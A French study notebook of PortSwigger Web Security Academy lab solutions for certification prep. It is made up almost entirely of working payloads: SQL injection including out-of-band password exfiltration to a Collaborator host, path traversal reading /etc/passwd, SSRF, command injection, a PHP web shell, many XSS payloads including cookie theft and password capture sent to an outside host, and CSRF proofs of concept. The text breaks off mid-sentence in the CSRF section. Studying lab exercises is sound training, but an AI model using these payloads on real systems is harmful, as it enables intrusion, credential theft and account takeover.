# Labs PortSwigger - Préparation BSCP

https://portswigger.net/web-security/all-labs 

## === SQL ===

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

    GET /filter?category=Lifestyle’+OR+1=1--

### SQL injection vulnerability allowing login bypass

    administrator’--
    
### SQL injection attack, querying the database type and version on Oracle

	GET /filter?category=Gifts‘+UNION+SELECT+'abc','def'+FROM+dual–
	GET /filter?category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
    
### SQL injection attack, querying the database type and version on MySQL and Microsoft

    GET /filter?category='+UNION+SELECT+@@version,+NULL#

###  SQL injection attack, listing the database contents on non-Oracle databases

	GET /filter?category=Pets'+UNION+SELECT+'1'--
    GET /filter?category=Pets'+UNION+SELECT+'1','2'--
    GET /filter?category=Pets'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
	GET /filter?category=Pets'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_ikwqbr'--
	GET /filter?category=Pets'+UNION+SELECT+username_qtcsru,+password_vgkvts+FROM+users_ikwqbr--

### SQL injection attack, listing the database contents on Oracle

    GET /filter?category='+UNION+SELECT+'abc','def'+FROM+dual--
    GET /filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables–
    GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_WQIUUS'-- HTTP/2
    GET /filter?category='+UNION+SELECT+USERNAME_FJLMOM,+PASSWORD_CCZEKZ+FROM+USERS_WQIUUS--

### SQL injection UNION attack, determining the number of columns returned by the query

	GET /filter?category=Gifts'+UNION+SELECT+NULL--
	GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL--
	GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
    
### SQL injection UNION attack, finding a column containing text

	[...]
	GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL--
	[...]
	GET /filter?category=Pets'+UNION+SELECT+NULL,'EHvVry',NULL--
    
### SQL injection UNION attack, retrieving data from other tables

	GET /filter?category=Pets'+UNION+SELECT+NULL,NULL--
	GET /filter?category=Pets'+UNION+SELECT+username,+password+FROM+users--

### SQL injection UNION attack, retrieving multiple values in a single column

    '+UNION+SELECT+NULL,'abc'--
    '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
    
### Blind SQL injection with conditional responses

Observer une requête classique vers l’accueil et remarquer le cookie : 

> Cookie: TrackingId=AsEECmnKwKq4S8Dz;session=4v8uojPB68SuAE0HldN5njc1sQTPnqIp

En injectant un payload de type **' AND '1'='1** on voit que le message d'accueil est le même.

En injectant un payload de type **' AND '1'='2** on voit que le message d'accueil n'est plus là.

Suite de payloads suivant ce même principe et permettant de déterminer qu'il y a bien un utilisateur "administrateur" et que son mot de passe fait 20 caractères : 

    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT 'a' FROM users LIMIT 1)='a
    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT 'a' FROM users WHERE username='administrator')='a
    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
    [...]
    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a

Payloads à utiliser sur Intruder pour deviner chaque caractère du mot de passe : 

    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
    [...]
    TrackingId=3oaq5QBt7iUppPJX' AND (SELECT SUBSTRING(password,20,1) FROM users WHERE username='administrator')='a

Penser à aller dans la partie "Grep - Match" d'Intruder et à y entrer le message "Welcome back" pour avoir un facteur de discrimination des différents résultats.

Bien utiliser le TrackingId donné par le site pour ne pas invalider la condition.


### Blind SQL injection with conditional errors

En ajoutant un guillemet simple sur le paramètre "TrackingId" on observe une erreur.

En ajoutant un deuxième guillemet simple on observe que l'erreur disparaît : 

    TrackingId=Kbr9BLU0GzlbKuFw'         => Erreur
    TrackingId=Kbr9BLU0GzlbKuFw''        => Ok
    
On peut exploiter cette différence de traitement avec des sous-requêtes : 

    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT '' FROM dual)||'
    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT '' FROM not-a-real-table)||'
    
    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
    
    
Payloads pour déterminer la longueur du mot de passe : 

    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    [...]
    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN LENGTH(password)>20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Requêtes à mettre dans Intruder pour trouver chaque caractère de ce mot de passe : 

    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    [...]
    TrackingId=Kbr9BLU0GzlbKuFw'||(SELECT CASE WHEN SUBSTR(password,20,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    

Il suffit ensuite, pour chaque attaque Intruder, d'isoler la seule réponse dont le code de retour est 500.


### Visible error-based SQL injection

Dans l'historique Burp, trouver une requête avec le cookie "TrackingId" mentionné dans la consigne. Ajouter un guillemet simple dans ce paramètre, observer l'erreur renvoyée en réponse. Cette erreur contient la requête SQL passée au serveur.

Suite de payloads à utiliser pour exploiter cette requête plus en profondeur :

    TrackingId=ogAZZfxtOKUELbuJ'--
    TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
    TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)-- 
    TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

On convertit en int puis réduit le résultat à une seule entrée parce que l'erreur SQL renvoyée nous le demande. Une fois ces ajustements faits, les données se trouvent à la fin de l'erreur 500 renvoyée par le serveur.



### Blind SQL injection with time delays

    TrackingId=x'||pg_sleep(10)--
    
### Blind SQL injection with time delays and information retrieval


Tests initiaux : 

    TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
    
    TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
    
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Déduction de la longueur du mot de passe de l'administrateur : 

    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    [...] 
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    
Utilisation d'Intruder pour déduire chaque caractère du 1 au 20 : 

    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
    [...]
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,20,1)='§a§')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
    
Attention à bien remplir les payloads : **un seul caractère alphanumérique ou éventuellement un symbole**

Attention à bien envoyer les requêtes dans un seul thread pour ne pas fausser le temps obtenu : 
**"Resource pool" => "Maximum concurrent requests" => 1**

Attention à bien afficher le timer pour la réponse obtenue : 
**"Columns" => "Response received"**


### Blind SQL injection with out-of-band interaction
   
Injecter le payload suivant dans le paramètre TrackingId : 

    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//gcw5p5877y8iiifjnkat2gp28tek2aqz.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

Observer la requête qui arrive dans Collaborator.


### Blind SQL injection with out-of-band data exfiltration

    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.gcw5p5877y8iiifjnkat2gp28tek2aqz.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

### SQL injection with filter bypass via XML encoding

Sur la page de n'importe quel produit, on observe que la fonction "Check stock" passe du XML au serveur dans une requête POST : 

    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>3</productId>
        <storeId>1</storeId>
    </stockCheck>

En testant des payloads de calcul, on voit que le résultat est évalué : 

    <storeId>1+1</storeId>
    
En testant un payload de UNION-based SQLI, on voit qu'un WAF nous a bloqué : 

    <storeId>1 UNION SELECT NULL</storeId>
    
> HTTP/2 403 Forbidden
> Content-Type: application/json; charset=utf-8
> X-Frame-Options: SAMEORIGIN
> Content-Length: 17

> "Attack detected"


Comme on injecte du XML, il est peut-être possible de contourner ce WAF grâce à un bypass inspiré des failles XXE. 
Voir : 
- https://portswigger.net/web-security/xxe/xml-entities
- https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100


Payload final : 

    <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>


## === Server-side vulnerabilities ===

### File path traversal, simple case

    GET /image?filename=../../../etc/passwd

### File path traversal, traversal sequences blocked with absolute path bypass

	GET /image?filename=/etc/passwd
    
### File path traversal, traversal sequences stripped non-recursively

	GET /image?filename=....//....//....//etc/passwd
    
### File path traversal, traversal sequences stripped with superfluous URL-decode

	GET /image?filename=..%252f..%252f..%252fetc/passwd
    
### File path traversal, validation of start of path

	GET /image?filename=/var/www/images/../../../../../etc/passwd
    
### File path traversal, validation of file extension with null byte bypass

	GET /image?filename=../../../etc/passwd%00.png
    
### Unprotected admin functionality

	GET /robots.txt
	GET /administrator-panel
	GET /administrator-panel/delete?username=carlos
    
### Unprotected admin functionality with unpredictable URL

Observer le code-source de la page et remarquer cette partie : 
	
> adminPanelTag.setAttribute('href', '/admin-vnq2da');

	GET /admin-vnq2da
	GET /admin-vnq2da/delete?username=carlos
    
### User role controlled by request parameter

	GET /admin

Aller sur la page de login, puis commencer à intercepter les requêtes ET les réponses (“Proxy settings” => “Intercept reponses based on the following rules:”). 

Se connecter sur cette page avec les credentials d’utilisateur simple donnés dans la consigne.

Changer “Cookie: session=VrbUBr7c6DzenjfmQuOIDax5UndrINrK; Admin=false” en 
“Cookie: session=VrbUBr7c6DzenjfmQuOIDax5UndrINrK; Admin=true” dans la réponse puis dans chaque requête que l’on va effectuer avec cet utilisateur simple.

### User ID controlled by request parameter, with unpredictable user IDs

Aller sur n’importe quel article posté par Carlos et observer le paramètre “userId=d22a802d-ac88-48ff-b237-c137214a0f89” dans l’URL.

Se connecter avec le compte utilisateur fourni dans la consigne puis reprendre ce paramètre et le mettre dans l’URL suivante à la place du nôtre : 
https://0a98001b04df8474826c92e2004700dc.web-security-academy.net/my-account?id=fc22df53-bdc5-484b-9c5b-8f1b952d4f5a 

### User ID controlled by request parameter with password disclosure

Se connecter sur la page de login avec le compte utilisateur fourni dans la consigne.

Aller dans l’onglet “My account” et changer le paramètre de l’URL en “Administrator” : 

    GET /my-account?id=administrator

Observer le code HTML de la réponse obtenue, le mot de passe se trouve dans un formulaire caché : 

    <input required type=password name=password value='wz5ub7i9y4vqvcspqek2'/>

### Username enumeration via different responses

Lancer un Intruder pour déduire le vrai nom (Length 3250 vs Length 3248).
Lancer un deuxième Intruder avec le nom pour bruteforcer le login.

### 2FA simple bypass

Se connecter sur la page de login avec le compte fourni dans la consigne.
Aller sur l’onglet “Email client” pour réceptionner le 2FA.
Entrer le 2FA pour terminer l’authentification avec le premier compte.
Remarquer que l’URL se termine par “/my-account?id=wiener”.

Se connecter avec les credentials de la victime.

Quand le 2FA est demandé pour la victime, remplacer la fin de l’URL par “/my-account?id=carlos” et relancer la page.

### Basic SSRF against the local server

La page https://0a48007504a4974a81a78eee00540025.web-security-academy.net/admin est réservée aux administrateurs.

Utiliser la fonction “Check stock” sur n’importe quel article et l’intercepter sur Burp. 

Changer le paramètre “stockApi=XXX” de cette requête POST en “stockApi=http://localhost/admin” 

Dans le code de la réponse on peut remarquer : 

    <a href="/admin/delete?username=carlos">

Reproduire la même interception de requête mais cette fois avec “stockApi=http://localhost/admin/delete?username=carlos”
    
### Basic SSRF against another back-end system
    
Utiliser la fonction “Check stock” sur n’importe quel article et l’intercepter sur Burp. 

Changer le paramètre “stockApi=XXX” de cette requête POST en “stockApi=http://192.168.0.1:8080/admin” puis faire une attaque de 1 à 255 sur le dernier octet de l’IP avec l’Intruder.

Noter l’IP qui donne accès à la page d’administration et reproduire la requête dans le Repeater : 
“stockApi=http://192.168.0.41:8080/admin/delete?username=carlos “

### OS command injection, simple case

Utiliser la fonction “Check stock” sur n’importe quel article et l’envoyer sur le Repeater.

Remplacer “productId=2&storeId=1” par “productId=2&storeId=1;whoami”

### Remote code execution via web shell upload

Se connecter sur la page /my-account et changer d’avatar. D’abord choisir une image classique. 

Une fois l’image uploadée, rafraîchir pour regarder son compte et observer la requête avec Burp. Remarquer le morceau suivant : 

    <img src="/files/avatars/Portrait_of_Friedrich_Nietzsche.jpg" class=avatar>

Changer d’avatar une deuxième fois et mettre un webshell PHP classique à la place : 

    <?php echo system($_GET['command']); ?>

Exécuter le webshell en allant sur l’URL trouvée à partir de l’image : 

> https://0a31007e03aad04685695dc0002c00cf.web-security-academy.net/files/avatars/Webshell.php?command=ls

> https://0a31007e03aad04685695dc0002c00cf.web-security-academy.net/files/avatars/Webshell.php?command=cat%20/home/carlos/secret 

### Web shell upload via Content-Type restriction bypass

Tenter de déposer le même webshell que pour le lab précédent.

On voit cette erreur : 

“Sorry, file type application/octet-stream is not allowed 
Only image/jpeg and image/png are allowed 
Sorry, there was an error uploading your file.”

Sur Burp, prendre la requête POST et la transférer au Repeater.

Remplacer “Content-Type: application/octet-stream” par “Content-Type: image/jpeg” et la renvoyer

Aller sur l’URL permettant d’interagir avec le webshell : 

> https://0a4700d2034ad0458506767700390095.web-security-academy.net/files/avatars/Webshell.php?command=cat%20/home/carlos/secret 


## === Cross-site scripting ===

### Reflected XSS into HTML context with nothing encoded

Mettre “<script>alert(1)</script>” dans la barre de recherche.

### Stored XSS into HTML context with nothing encoded

Mettre “<script>alert(1)</script>” dans le commentaire.

### DOM XSS in document.write sink using source location.search

Entrer n’importe quoi dans la barre de recherche.
Remarquer le morceau suivant dans le code source : 

    function trackSearch(query) {
       document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if (query) {
       trackSearch(query);
    }


Envoyer le payload suivant dans la barre de recherche : 

    "><svg onload=alert(1)>

### DOM XSS in innerHTML sink using source location.search

Entrer n’importe quoi dans la barre de recherche.
Remarquer le morceau suivant dans le code source :

    <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
                            <script>
                                function doSearchQuery(query) {
                                    document.getElementById('searchMessage').innerHTML = query;
                                }
                                var query = (new URLSearchParams(window.location.search)).get('search');
                                if(query) {
                                    doSearchQuery(query);
                                }
                            </script>

Entrer le payload suivant dans la barre de recherche : 

    <img src=1 onerror=alert(1)>
    
### DOM XSS in jQuery anchor href attribute sink using location.search source

Cliquer sur le lien “Submit feedback” et remarquer que l’URL se termine par “/feedback?returnPath=/”

Changer le paramètre en “?returnPath=/AAAA” par exemple.

Remarquer le morceau de code suivant : 

    $(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath')); 
    });

Remarquer que notre valeur est insérée comme suit : 

    <a id="backLink" href="/AAAA">Back</a>

Répéter l’opération mais remplacer le paramètre par : 

    “?returnPath=javascript:alert(document.cookie)”

### DOM XSS in jQuery selector sink using a hashchange event

Remarquer le morceau suivant dans le code source : 

    $(window).on('hashchange', function(){
                                var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                                if (post) post.get(0).scrollIntoView();
                            }); 

Aller dans la partie “Go to exploit server” et mettre le payload suivant dans le body : 

    <iframe src="https://0aec002b04b2eb90807295f2009e00e0.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

Cliquer sur “Store” puis “Deliver exploit to victim”

### Reflected XSS into attribute with angle brackets HTML-encoded

Faire une recherche classique et voir le morceau suivant dans la réponse : 

    <input type=text placeholder='Search the blog...' name=search value="aaa">

La recherche est donc reflétée dans un attribut.
Répéter l’opération et injecter le payload suivant à la place : 

    "onmouseover="alert(1)

Rafraichir la page et passer la souris sur la barre de recherche, le payload est exécuté.

### Stored XSS into anchor href attribute with double quotes HTML-encoded 

Aller sur n’importe quel post et écrire un commentaire.

Voir le morceau suivant dans la nouvelle page : 

    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="a">a</a> | 05 October 2023
    </p>
    <p>AAA</p>

Notre site web est reflété dans un attribut href qui est ajouté sur notre nom.
Répéter l’opération et injecter le payload suivant à la place : 

	javascript:alert(2)

Après retour sur les commentaires, cliquer sur le nom de l’attaquant déclenche le payload.


### Reflected XSS into a JavaScript string with angle brackets HTML encoded

Faire une recherche classique et repérer le morceau suivant dans le code source de la réponse : 

    var searchTerms = 'a';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');

Injecter le payload suivant dans la barre de recherche : 

    a' ; alert(1) ; //


### DOM XSS in document.write sink using source location.search inside a select element

Dans la page de n’importe quel produit, remarquer le morceau suivant : 

    “var store = (new URLSearchParams(window.location.search)).get('storeId');
        document.write('<select name="storeId">');”

Ajouter un “&storeId=12345” à la fin de l’URL et voir que ce paramètre a bien été impacté dans le menu déroulant.

Répéter la même opération avec le payload suivant : 

    "></select><img%20src=1%20onerror=alert(1)>
    
### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

En tentant un payload classique dans la barre de recherche, on voit que les chevrons et les guillemets sont encodés : 

    <h1>0 search results for 'aaa&apos; &lt;script&gt; alert(1) &lt;/script&gt;'</h1>

Remarquer le “<body ng-app\>” qui englobe toute la page.

Entrer le payload suivant dans la barre de recherche :

    {{$on.constructor('alert(1)')()}}

### Reflected DOM XSS

Remarquer que le contenu de la recherche est exploité par un autre script : 

	<script src='/resources/js/searchResults.js'></script>
    <script>search('search-results')</script>

Intercepter une recherche classique avec Burp pour en observer le fonctionnement.

On peut voir que la recherche se fait en deux étapes : 

    GET /?search=XSS HTTP/2
    ...
    GET /search-results?search=XSS HTTP/2

On voit que la réponse à la deuxième requête a cette structure : 

    {"results":[],"searchTerm":"XSS"}

En observant le code du script searchResults.js on observe le morceau suivant : 

    if (this.readyState == 4 && this.status == 200) {
                eval('var searchResultsObj = ' + this.responseText);
                displaySearchResults(searchResultsObj);
            }

Envoyer la deuxième requête dans le Repeater et tester tous les symboles classiques pour vérifier lesquels sont gérés : \ “ ‘ ; < > 

On observe que les guillemets sont échappés mais pas les antislashs, on peut donc annuler n’importe quel échappement de caractère en ajoutant un antislash avant.

Entrer le payload suivant dans la barre de recherche : 

    \"-alert(1)}//

### Stored DOM XSS

Dans le code source de la page des commentaires sur n’importe quel post, on remarque le morceau suivant : 

    <script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>
    <script>loadComments('/post/comment')</script>

Dans le code source du script externe, on voit que la fonction d’échappement des chevrons est la suivante : 

    function escapeHTML(html) {
            return html.replace('<', '&lt;').replace('>', '&gt;');
        }

La fonction replace() ne remplace que la première occurrence, on peut donc la contourner avec des payloads commençant par “<>” par exemple.

Ecrire un commentaire contenant le payload suivant : 

    <><img src=1 onerror=alert(1)>
    
### Reflected XSS into HTML context with most tags and attributes blocked

La consigne du lab indique qu’il faut utiliser la fonction print() 

En essayant des payloads classiques, on est envoyé par le WAF sur une page disant “Tag is not allowed”, ce qui sous-entend qu’il y a des balises autorisées et des balises interdites.

On voit que notre recherche est renvoyée dans la balise suivante : 

	<h1>0 search results for 'a'</h1>

Envoyer une requête de recherche dans l’Intruder et utiliser une liste de balises comme celle-ci (colonne de gauche) pour les payloads à insérer dans “<§§>” : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

La seule réponse avec un code 200 est “body”

Répéter la même manoeuvre en mettant “<body%20§§=1>” et en utilisant la liste des events (colonne du milieu) pour les payloads.

On voit que la seule réponse avec un code 200 est pour “onresize” 

Une fois ces informations obtenues, aller dans “Go to exploit server” et mettre le payload suivant dans le body : 

    <iframe src="https://0a9600f103427bb88508962f00d80072.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

Cliquer sur “Store” puis “Deliver exploit to victim”

### Reflected XSS into HTML context with all tags blocked except custom ones

    <script>
    location = 'https://0ab2007804cb9afa816f1b1000430033.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
    </script>

### Reflected XSS with some SVG markup allowed

Faire une recherche et envoyer la requête dans l’Intruder.
Refaire la technique de l’attaque sur ce champ avec la liste des balises : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

On observe que les balises \<svg>, \<animatetransform>, \<title> et \<image> passent.

Remplacer l’ancien payload (<§§>) par \<svg>\<animatetransform%20§§=1> et relancer une attaque Intruder avec cette fois la liste des évènements au lieu des balises. 

On observe que seul l’évènement "onbegin" passe. 

Utiliser ces informations pour constituer le payload final : 

> https://0a21001a04671a1380eb4ec9001800f3.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

### Reflected XSS in canonical link tag

La consigne nous dit que le challenge doit se faire sur Chrome, et que l’utilisateur ciblé va faire plusieurs combinaisons de touches avec “X”.

Voir : https://developer.mozilla.org/fr/docs/Web/HTML/Global_attributes/accesskey 

Remplacer l’URL par le payload suivant : 

> https://0ab4004c0423461f80133f6c002300fa.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) 

### Reflected XSS into a JavaScript string with single quote and backslash escaped

Faire une recherche banale puis observer le code source de la réponse. On remarque le morceau suivant : 

    <script>
        var searchTerms = 'aaa';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

Quand on essaye d’injecter un guillemet simple, on voit que la recherche est reflétée de la manière suivante : 

    var searchTerms = 'a\'';

En essayant d’ajouter un antislash pour contourner ce problème, on remarque qu’il est échappé aussi : 

	var searchTerms = 'a\\\'';

Injecter le payload suivant à la place : 

    </script><script>alert(1)</script>

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Faire une recherche banale puis observer le code source de la réponse. On remarque le morceau suivant : 

    <script>
    var searchTerms = 'aaa';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

En testant quelques payloads comme pour le lab précédent, on voit que le guillemet simple est échappé mais pas l’antislash. 

Injecter le payload suivant dans la recherche : 

    a\' ; alert(1); //
    
### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

En postant un commentaire simple, on observe que le nom de notre site web est reflété dans un attribut “onclick” : 

    …
    <img src="/resources/images/avatarDefault.svg" class="avatar"> <a id="author" href="http://site.fr" onclick="var tracker={track(){}};tracker.track('http://site.fr');">nnn</a> | 20 October 2023
    …

Poster un commentaire en renseignant le payload suivant pour notre site web : 

> http://foo?&apos;-alert(1)-&apos;

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

En faisant une recherche classique, on voit que notre entrée est reflétée dans le morceau de Javascript suivant : 

    <script>
    var message = `0 search results for 'aaa'`;
    document.getElementById('searchMessage').innerText = message;
    </script>

Ces backquotes indiquent une template string, et il est possible d’injecter des expressions dedans avec “${expression}” par exemple.

Voir : https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals 

Injecter le payload suivant dans la barre de recherche : 

    ${alert(1)}

### Exploiting cross-site scripting to steal cookies

Aller sur n'importe quel post du site et mettre un commentaire avec le payload suivant :

    <script>
    fetch('https://q2tvkl5p1jxsr2xxivm9q9w0oruii86x.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
    </script>

Le cookie arrive dans Collaborator => Requête HTTP => Request to Collaborator

Reprendre la ligne du cookie et l'ajouter dans la requête vers la page /my-account que l'on aura au préalable envoyée sur le Repeater.

### Exploiting cross-site scripting to capture passwords

Aller sur n'importe quel post du site et mettre un commentaire avec le payload suivant :

    <input name=username id=username>
    <input type=password name=password onchange="if(this.value.length)fetch('https://q2tvkl5p1jxsr2xxivm9q9w0oruii86x.oastify.com',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
    });">
    
Récupérer les identifiants dans le Collaborator.

### Exploiting XSS to perform CSRF

Aller sur n'importe quel post du site et mettre un commentaire avec le payload suivant : 

    <script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/my-account',true);
    req.send();
    function handleResponse() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open('post', '/my-account/change-email', true);
        changeReq.send('csrf='+token+'&email=test@test.com')
    };
    </script>
    

### (EXPERT) Reflected XSS with AngularJS sandbox escape without strings

    
    ?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1


### (EXPERT) Reflected XSS with AngularJS sandbox escape and CSP

    <script> location='https://0aac00e3037791228023b26900d800bb.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script>


### (EXPERT) Reflected XSS with event handlers and href attributes blocked

    https://0a8f002704b50f3e83acec0b00cb0070.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

### (EXPERT) Reflected XSS in a JavaScript URL with some characters blocked

    https://0a61006b0327942c816a7fab008c0040.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

### (EXPERT) Reflected XSS protected by very strict CSP, with dangling markup attack 

TO DO 

### (EXPERT) Reflected XSS protected by CSP, with CSP bypass

https://0a81002b0431f3f3817103770080005a.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27 


## === CSRF ===

### CSRF vulnerability with no defenses

Faire une requête de changement d'adresse mail classique sur le compte fourni.

Récupérer la requête sur Burp puis faire "Generate CSRF PoC".

Aller sur le serveur mis à disposition pour délivrer l'exploit, copier le PoC dedans et l'envoyer à la cible.


### CSRF where token validation depends on request method

En modifiant notre adresse mail et en observant la requête POST associée, on voit les paramètres suivants : 

    email=test%40gmail.com&csrf=eTRTboOswEpqBqMapfJx1CO3QPL6anMa
    
Si on tente de modifier le token, on obtient une erreur 400.

Cliquer sur le menu contextuel de la requête puis sur "Change request method" avant de la renvoyer. La requête est acceptée en GET.

Sur cette requête modifiée, faire "Generate CSRF PoC"

Délivrer le payload sur le serveur. 

Attention à bien changer d'adresse et à bien corriger les éventuels problèmes d'encodage.

### CSRF where token validation depends on token being present

Pareil mais ne pas changer la méthode en GET, simplement retirer le paramètre "csrf" et ne laisser que "email=test@gmail.com" dans la requête POST.

Exemple de PoC :

    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
        <form action="https://0a4400eb03b8ebf8816ec5ea00460018.web-security-academy.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="test2@gmail.com" />
          <input type="submit" value="Submit request" />
        </form>
        <script>
          history.pushState('', '', '/');
          document.forms[0].submit();
        </script>
      </body>
    </html>


### CSRF where token is not tied to user session

Se connecter avec un des deux comptes fournis, générer le PoC, et remplacer le token CSRF sur l'autre.

Il est important de bien intercepter la requête sur le premier compte et de ne pas la laisser passer, le token est à usage unique.

Simplement transférer la requête interceptée dans le Repeater avant de la jeter fonctionne aussi.


### CSRF where token is tied to non-session cookie

#### Première étape

Remarquer la ligne suivante dans la requête de changement d'adresse : 

> Cookie: session=7RRxk0eFq3ztgrEn0FBYkIqx6q95MH1J; csrfKey=yQuUE7omVwdwWkKddJm6DDTwc0EF11ZG

En changeant juste le cookie on est redirigé vers /login
En changeant juste le token CSRF on a une erreur 400

Déduction : le token CSRF n'est pas forcément lié à la session.


#### Deuxième étape

Faire une recherche classique et l'envoyer dans le Repeater. On observe que la dernière recherche effectuée est reflétée dans le header "Set-Cookie". Puisque cette fonction de recherche n'a pas de protection CSRF, on peut l'exploiter pour injecter les cookies chez la victime.

Créer une URL de ce type : 

